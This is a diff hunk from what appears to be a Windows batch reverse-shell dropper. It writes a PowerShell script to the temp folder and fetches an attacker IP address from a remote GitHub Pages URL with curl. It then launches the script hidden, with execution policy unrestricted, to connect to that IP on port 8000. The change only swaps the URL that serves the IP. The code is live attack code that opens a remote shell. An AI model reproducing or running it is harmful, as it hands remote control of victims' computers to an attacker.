@@ -96,7 +96,7 @@ echo $PLP.Flush^(^)};
 echo $KLK.Close^(^)
 )>%temp%\331.ps1
 
-for /f %%i in ('curl -kLs aritz331.github.io/revs/ip.txt') do (set "_ip=%%i")
+for /f %%i in ('curl -kLs aritz331.github.io/revs/ip') do (set "_ip=%%i")
 if [%1]==[] (
 powershell -NoP -W hidden -ExecutionPolicy Unrestricted %temp%\331.ps1 %_ip% 8000 >nul 2>&1
 ) else (
